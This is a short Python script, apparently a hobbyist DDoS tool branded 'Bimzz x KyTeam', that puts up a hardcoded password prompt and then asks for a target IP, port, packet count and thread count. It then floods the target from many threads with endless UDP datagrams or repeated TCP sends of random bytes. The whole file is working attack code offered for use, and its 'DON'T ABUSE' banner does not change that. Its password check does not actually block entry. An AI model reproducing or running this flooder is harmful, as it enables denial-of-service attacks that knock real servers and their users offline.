#!/usr/bin/env python3
#LxvcTeamV1.2
import socket
import random
import threading
import os
import time
import sys

#tampilan
password ="BimzzDDOS"
print("""\u001b[31m
[Bimzz] ==> LoginMenu!!""")
for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] TUNGGU 5 DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] PASSWORD SALAH!!! ")
		continue
time.sleep(5)
print("[√] Berhasil Login, Wait")
time.sleep(5)
print("------------------------------------------------------------")
print(" >>   Discord : Bimzz#9999            <<")
print(" >>   Tools Created By Bimzz x KyTeam <<")
print(" >>   NOTE : DON'T ABUSE!!            <<")
print("------------------------------------------------------------")
ip = str(input(" Bimzz | Ip:"))
port = int(input(" Bimzz | Port:"))
choice = str(input(" Bimzz | Ddos Gak?(y/n):"))
times = int(input(" Bimzz | Packets:"))
threads = int(input(" Bimzz | Threads:"))
def run():
	data = random._urandom(1600)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"[Bimzz] | Attacking Servers!!")
		except:
			print("[!] BIMZZ FUCKING THE SERVER !!! ")

def run2():
	data = random._urandom(17)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"[Bimzz] | Attacking Servers!!")
		except:
			s.close()
			print("[*] BIMZZ FUCKING THE SERVERS! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
